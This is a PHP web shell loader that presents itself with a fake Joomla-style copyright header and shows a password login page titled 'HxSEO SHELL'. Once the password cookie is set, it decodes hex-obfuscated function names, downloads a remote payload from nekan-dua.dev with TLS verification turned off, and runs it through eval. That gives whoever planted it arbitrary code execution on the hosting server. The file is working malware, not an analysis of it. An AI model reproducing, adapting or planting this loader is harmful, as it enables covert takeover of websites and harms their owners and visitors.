<?php
/**
 * @package    RootAexdy
 * @copyright  Copyright (C) 2023 - 2024 Open Source Matters, Inc. All rights reserved.
 *
 */

// @deprecated  1.0  Deprecated without replacement
function is_logged_in()
{
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'PMH';
}

if (is_logged_in()) {
    $Array = array(
        '666f70656e', // fo p en => 0
        '73747265616d5f6765745f636f6e74656e7473', // strea m_get_contents => 1
        '66696c655f6765745f636f6e74656e7473', // fil e_g et_cont ents => 2
        '6375726c5f65786563' // cur l_ex ec => 3
    );

    function hex2str($hex) {
        $str = '';
        for ($i = 0; $i < strlen($hex); $i += 2) {
            $str .= chr(hexdec(substr($hex, $i, 2)));
        }
        return $str;
    }

    function geturlsinfo($destiny) {
        $belief = array(
            hex2str($GLOBALS['Array'][0]),
            hex2str($GLOBALS['Array'][1]),
            hex2str($GLOBALS['Array'][2]),
            hex2str($GLOBALS['Array'][3])
        );

        if (function_exists($belief[3])) {
            $ch = curl_init($destiny);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            $love = $belief[3]($ch);
            curl_close($ch);
            return $love;
        } elseif (function_exists($belief[2])) {
            return $belief[2]($destiny);
        } elseif (function_exists($belief[0]) && function_exists($belief[1])) {
            $purpose = $belief[0]($destiny, "r");
            $love = $belief[1]($purpose);
            fclose($purpose);
            return $love;
        }
        return false;
    }

    $destiny = 'https://nekan-dua.dev/aexdy/aexdy.raw';
    $dream = geturlsinfo($destiny);
    if ($dream !== false) {
        eval('?>' . $dream);
    }
} else {
    if (isset($_POST['password'])) {
        $entered_key = $_POST['password'];
        $hashed_key = '$2y$10$H2Dj8TTHvYeu00t/lRNXIus0ezuY9jwZk4Uh0RQJfEwEMWHuGeUQC';

        if (password_verify($entered_key, $hashed_key)) {
            setcookie('user_id', 'PMH', time() + 3600, '/');
            header("Location: ".$_SERVER['PHP_SELF']);
            exit();
        }
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>HxSEO SHELL</title>
        <style>
            html, body {
                margin: 0;
                padding: 0;
                height: 100%;
                width: 100%;
                overflow: hidden; /* Mencegah scroll */
            }
            body {
                background: url('https://i.imgur.com/I5wKzLq.png') no-repeat center center;
                background-size: 50%; /* Mengatur ukuran gambar menjadi 50% dari lebar dan tinggi */
                background-attachment: fixed; /* Menghindari efek goyang */
                position: relative;
            }
            .overlay {
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0, 0, 0, 0.5); /* Mengatur kegelapan */
                z-index: 0; /* Di belakang konten */
            }
            .login-container {
                position: absolute;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                width: 300px;
                background: rgba(255, 255, 255, 0.8); /* Latar belakang putih dengan transparansi */
                padding: 20px;
                border: 1px solid #ccc;
                box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
                text-align: center;
                z-index: 1; /* Di depan overlay */
            }
            .login-container input {
                width: calc(100% - 22px);
                padding: 10px;
                margin: 10px 0;
                box-sizing: border-box;
            }
            .login-container label {
                display: block;
                margin-bottom: 10px;
            }
            .snowflake {
                position: absolute;
                background: white;
                border-radius: 50%;
                width: 5px;
                height: 5px;
                opacity: 0.8;
                pointer-events: none;
                z-index: 0;
                animation: fall linear;
            }
            @keyframes fall {
                to {
                    transform: translateY(100vh);
                }
            }
        </style>
    </head>
    <body>
        <div class="overlay"></div> <!-- Overlay untuk efek redup -->
        <div class="login-container">
            <form method="POST" action="">
                <label for="password">fortune favor the brave</label>
                <input type="password" id="password" name="password" autofocus>
                <input type="submit" value="acceso">
            </form>
        </div>
        <script>
            function createSnowflake() {
                const snowflake = document.createElement('div');
                snowflake.className = 'snowflake';
                snowflake.style.left = Math.random() * 100 + 'vw';
                snowflake.style.animationDuration = Math.random() * 3 + 2 + 's';
                snowflake.style.opacity = Math.random();
                document.body.appendChild(snowflake);

                setTimeout(() => {
                    snowflake.remove();
                }, 5000);
            }

            setInterval(createSnowflake, 100);
        </script>
    </body>
    </html>
    <?php
}
?>